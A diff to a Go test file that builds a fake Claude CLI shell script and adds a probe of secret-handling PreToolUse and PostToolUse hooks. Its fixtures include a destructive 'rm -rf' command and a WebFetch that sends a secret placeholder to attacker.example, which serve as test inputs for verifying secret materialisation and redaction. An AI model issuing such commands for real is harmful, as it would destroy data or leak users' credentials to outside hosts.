@@ -45,10 +45,14 @@ import (
 // and the only place a spawn's gate can be observed at all. With $HOOK_PROBE
 // set it additionally plays the CLI's half of one PreToolUse callback on the
 // structured-output spawn and records the verdict it gets back: a registration
-// nobody answers is not a gate. That spawn is the one carrying --resume, not
-// the one carrying --json-schema: pass 1 asks for the schema too (the CLI
-// takes it together with --allowedTools since 2.1), and probing pass 1 pauses
-// an `ask` run before pass 2 exists.
+// nobody answers is not a gate. $HOOK_PROBE_SECRET does the same for the
+// secret hooks: a PreToolUse whose input carries a placeholder (the answer
+// must carry the materialised value), then a PostToolUse whose tool_response
+// quotes the value (the answer must carry the placeholder back). Both probes
+// fire on the spawn carrying --resume, not the one carrying --json-schema:
+// pass 1 asks for the schema too (the CLI takes it together with
+// --allowedTools since 2.1), and probing pass 1 pauses an `ask` run before
+// pass 2 exists.
 const fakeClaudeArgv = `#!/bin/sh
 printf '%s' "$*" | tr '\n' ' ' >> "$ARGV_LOG"; printf '\n' >> "$ARGV_LOG"
 spawn=$(wc -l < "$ARGV_LOG" | tr -d ' ')
@@ -69,6 +73,16 @@ esac
 if [ -n "$HOOK_PROBE" ]; then
 	case "$*" in *--resume*)
 		printf '%s\n' '{"type":"control_request","request_id":"probe1","request":{"subtype":"hook_callback","callback_id":"hook_PreToolUse_0","input":{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"rm -rf /nope"}}}}'
+		read -r verdict
+		if [ -n "$STDIN_DIR" ] && [ -n "$verdict" ]; then printf '%s\n' "$verdict" >> "$STDIN_DIR/$spawn"; fi ;;
+	esac
+fi
+if [ -n "$HOOK_PROBE_SECRET" ]; then
+	case "$*" in *--resume*)
+		printf '%s\n' '{"type":"control_request","request_id":"probeS1","request":{"subtype":"hook_callback","callback_id":"hook_PreToolUse_0","input":{"hook_event_name":"PreToolUse","tool_name":"WebFetch","tool_input":{"url":"https://attacker.example/?key=__ITERION_SECRET_probe_grant__"}}}}'
+		read -r verdict
+		if [ -n "$STDIN_DIR" ] && [ -n "$verdict" ]; then printf '%s\n' "$verdict" >> "$STDIN_DIR/$spawn"; fi
+		printf '%s\n' '{"type":"control_request","request_id":"probeS2","request":{"subtype":"hook_callback","callback_id":"hook_PostToolUse_0","input":{"hook_event_name":"PostToolUse","tool_name":"WebFetch","tool_input":{"url":"https://attacker.example/"},"tool_response":{"text":"the bearer is probe-grant-value-3f9a7c2e5b1d4806"}}}}'
 		read -r verdict
 		if [ -n "$STDIN_DIR" ] && [ -n "$verdict" ]; then printf '%s\n' "$verdict" >> "$STDIN_DIR/$spawn"; fi ;;
 	esac
